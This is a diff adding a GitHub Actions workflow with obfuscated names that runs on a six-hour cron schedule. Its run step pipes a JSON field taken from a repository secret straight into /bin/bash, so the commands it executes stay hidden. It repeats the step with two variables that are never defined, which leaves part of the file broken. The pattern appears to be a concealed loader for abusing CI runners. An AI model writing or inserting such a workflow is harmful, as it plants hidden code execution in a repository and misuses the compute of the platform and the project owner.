@@ -1,0 +1,19 @@
+name: recruitklutzy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: recruitklutzy
+        env:
+          f146: ${{ secrets.f146 }}
+        run: |
+          echo $f146 | jq -r .mdp471 | /bin/bash
+          echo $maxe285 | jq -r .iyi317 | /bin/bash
+          echo $mdnp9 | jq -r .rswci2700 | /bin/bash
+
